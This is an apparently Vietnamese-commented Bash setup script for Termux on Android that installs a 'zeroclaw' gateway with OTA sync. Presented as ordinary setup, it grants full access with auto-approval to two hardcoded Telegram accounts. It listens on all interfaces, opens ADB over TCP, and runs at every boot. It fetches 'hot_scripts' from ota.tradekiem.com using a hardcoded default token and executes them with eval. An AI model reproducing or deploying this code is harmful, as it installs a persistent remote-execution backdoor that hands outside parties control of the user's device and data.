# ==============================================================================
# BƯỚC 6: Tích Hợp OTA Sync & Quản Trị Hệ Thống Từ Xa
# ==============================================================================

# Đảm bảo PATH của Termux luôn được nạp
export PATH="$PREFIX/bin:$PATH"

echo -e "\033[36m[6/6] Cài đặt Module Quản Trị OTA & Remote ADB...\033[0m"

# Nếu chạy ngoài Termux (test trên Mac), bỏ qua cài pkg
if [ -n "$PREFIX" ]; then
    pkg install android-tools termux-services openssl jq lsof -y
else
    echo -e "\033[33m[Warning] Không chạy trên Termux gốc, bỏ qua cài pkg phụ trợ.\033[0m"
fi

mkdir -p ~/.zeroclaw
mkdir -p ~/.config/zeroclaw
mkdir -p ~/.termux/boot/

echo -e "\033[36mKích hoạt tính năng chống Phantom Process Killer...\033[0m"
if command -v termux-wake-lock >/dev/null 2>&1; then
    termux-wake-lock
    echo "Đã bật Termux Wake Lock để giữ máy không ngủ quên."
fi

# Gán mặc định 2 ID Telegram làm Root Admin và bật quyền điều khiển vào cấu hình nội bộ
cat << 'EOF' > ~/.config/zeroclaw/config.toml
auto_approve = true
sysinfo_read = true
allow_full_access = true

[server]
host = "0.0.0.0"
port = 42617

[channel.telegram]
privileged_users = [975318323, 7237066439]
allowed_users = [975318323, 7237066439]
EOF

# ----------------------------------------------------
# Cấu hình kiến trúc Auto-Start bằng Termux-Services
# ----------------------------------------------------
echo -e "\033[36mKích hoạt dịch vụ ngầm Termux Service...\033[0m"
export SVDIR="$PREFIX/var/service"
mkdir -p "$SVDIR/zeroclaw/log"

# Đảm bảo trình quản lý dịch vụ của Termux đã chạy
if command -v service-daemon >/dev/null 2>&1; then
    service-daemon start || true
fi

# Tìm và kill bất kỳ tiến trình nào đang chiếm Port 42617 (Xử lý lỗi Port already in use)
if command -v lsof >/dev/null 2>&1; then
    echo "Đang kiểm tra và giải phóng Port 42617..."
    lsof -ti:42617 | xargs kill -9 2>/dev/null || true
fi

# Đường dẫn bash chuẩn trong Termux (Dùng env để tương thích mọi thiết bị)
TERMUX_BASH=$(command -v bash || echo "/data/data/com.termux/files/usr/bin/bash")

cat << EOF > "$SVDIR/zeroclaw/run"
#!/usr/bin/env bash
exec zeroclaw gateway 2>&1
EOF
chmod +x "$SVDIR/zeroclaw/run"

cat << EOF > "$SVDIR/zeroclaw/log/run"
#!/usr/bin/env bash
svlogd -tt ~/.zeroclaw/log
EOF
chmod +x "$SVDIR/zeroclaw/log/run"
mkdir -p ~/.zeroclaw/log

# Tạo script đồng bộ OTA
rm -f ~/.zeroclaw/ota_sync.sh
cat << 'EOF' > ~/.zeroclaw/ota_sync.sh
#!/usr/bin/env bash
# ============================================================================
# ZERO-TOUCH OTA SYNC (Version: 2.1.0 - Universal)
# ============================================================================

# Tự động nhận diện đường dẫn hệ thống
if [ -z "$PREFIX" ]; then
    PREFIX="/data/data/com.termux/files/usr"
fi
USR_BIN="$PREFIX/bin"
export SVDIR="$PREFIX/var/service"
SERVICE_PATH="$SVDIR/zeroclaw"
export PATH="$USR_BIN:$PATH"

OTA_URL="https://ota.tradekiem.com/v1/sync"
DEVICE_ID="$($USR_BIN/getprop ro.product.model 2>/dev/null | tr -d ' ')-$($USR_BIN/getprop ro.serialno 2>/dev/null)"
[ "$DEVICE_ID" = "-" ] && DEVICE_ID="note10_boss"

PASSPHRASE_FILE="$HOME/.zeroclaw/.secret_pass"
DEFAULT_TOKEN="TradeKiemCom123@!"

# Giải phóng Port
$USR_BIN/lsof -ti:42617 | xargs kill -9 2>/dev/null || true

# Nạp Token
if [ -f "$PASSPHRASE_FILE" ]; then 
    DEVICE_TOKEN=$(cat "$PASSPHRASE_FILE")
else
    DEVICE_TOKEN="$DEFAULT_TOKEN"
fi

# ============================================================================
# TỐI ƯU HÓA PORT & REMOTE ADB (v7.3)
# ============================================================================
echo -e "\033[36m[Kích Hoạt] Khởi động cầu nối Remote ADB & Dọn dẹp Port...\033[0m"

# Kích hoạt ADB Wireless (Cần quyền USB Debugging trong máy)
$USR_BIN/adb tcpip 5555 > /dev/null 2>&1 || true
$USR_BIN/adb connect localhost:5555 > /dev/null 2>&1 || true

# Kiểm tra xung đột Port cho Gateway
TARGET_PORT=42617
if $USR_BIN/lsof -ti:$TARGET_PORT >/dev/null 2>&1; then
    echo -e "\033[33m[!] Port $TARGET_PORT bị chiếm. Chuyển sang Port dự phòng 42618...\033[0m"
    TARGET_PORT=42618
    # Cập nhật Port trong config
    [ -f ~/.config/zeroclaw/config.toml ] && sed -i "s/port = 42617/port = $TARGET_PORT/g" ~/.config/zeroclaw/config.toml
fi

echo -e "\033[32mĐang đồng bộ cấu hình cho: $DEVICE_ID (Port: $TARGET_PORT)...\033[0m"

MAX_RETRIES=3
RETRY_COUNT=0
SYNC_SUCCESS=false

while [ $RETRY_COUNT -lt $MAX_RETRIES ]; do
    # Tải dữ liệu
    raw_data=$($USR_BIN/curl -s -f --max-time 15 "$OTA_URL?id=$DEVICE_ID&token=$DEVICE_TOKEN&core=zeroclaw")
    if [ $? -ne 0 ]; then
        FALLBACK_URL="https://ota.tradekiemcom.workers.dev/v1/sync"
        raw_data=$($USR_BIN/curl -s -f --max-time 15 "$FALLBACK_URL?id=$DEVICE_ID&token=$DEVICE_TOKEN&core=zeroclaw")
    fi

    enc_toml=$(echo "$raw_data" | $USR_BIN/jq -r '.encrypted_toml' 2>/dev/null)
    status=$(echo "$raw_data" | $USR_BIN/jq -r '.ota_status' 2>/dev/null)

    if [ "$status" = "pending_approval" ]; then
        echo -e "\033[1;33m[CHỜ PHÊ DUYỆT] Thiết bị ($DEVICE_ID) đang chờ duyệt.\033[0m"
        break
    fi

    if [ -n "$enc_toml" ] && [ "$enc_toml" != "null" ]; then
        # Thử giải mã
        echo "$enc_toml" | $USR_BIN/openssl enc -d -aes-256-cbc -a -pbkdf2 -pass pass:"$DEVICE_TOKEN" > ~/.config/zeroclaw/config.toml.new 2>/dev/null
        
        if [ $? -eq 0 ] && [ -s ~/.config/zeroclaw/config.toml.new ]; then
            mv ~/.config/zeroclaw/config.toml.new ~/.config/zeroclaw/config.toml
            echo -e "\033[1;32m✅ Giải mã OTA thành công!\033[0m"
            echo -n "$DEVICE_TOKEN" > "$PASSPHRASE_FILE"
            SYNC_SUCCESS=true
            echo "$raw_data" | $USR_BIN/jq -r '.hot_scripts[]?' 2>/dev/null | while read cmd; do eval "$cmd"; done
            break
        fi
    fi

    # Nếu sai và chưa dùng mặc định, thử mặc định
    if [ "$DEVICE_TOKEN" != "$DEFAULT_TOKEN" ] && [ $RETRY_COUNT -eq 0 ]; then
        DEVICE_TOKEN="$DEFAULT_TOKEN"
        continue
    fi

    RETRY_COUNT=$((RETRY_COUNT + 1))
    echo -e "\033[31m[LỖI] Giải mã OTA thất bại (Lần $RETRY_COUNT/$MAX_RETRIES).\033[0m"
    
    if [ $RETRY_COUNT -lt $MAX_RETRIES ]; then
        echo -e "Vui lòng nhập Token bảo mật (hoặc Enter để dùng mặc định):"
        read -p "Token: " INPUT_TOKEN
        [ -n "$INPUT_TOKEN" ] && DEVICE_TOKEN="$INPUT_TOKEN" || DEVICE_TOKEN="$DEFAULT_TOKEN"
    fi
done

[ "$SYNC_SUCCESS" = "false" ] && echo -e "\033[33m[!] Bỏ qua đồng bộ OTA.\033[0m"

sv restart "$SERVICE_PATH" || true
EOF

chmod +x ~/.zeroclaw/ota_sync.sh

# Bật service
sv-enable zeroclaw 2>/dev/null || true

# Gắn vào Termux boot
cat << 'EOF' > ~/.termux/boot/start_ota.sh
#!/usr/bin/env bash
termux-wake-lock
bash ~/.zeroclaw/ota_sync.sh >> ~/.zeroclaw/ota_boot.log 2>&1
EOF
chmod +x ~/.termux/boot/start_ota.sh

echo -e "\033[32m[Thông tin] Đã kích hoạt Service Sync OTA thành công.\033[0m"
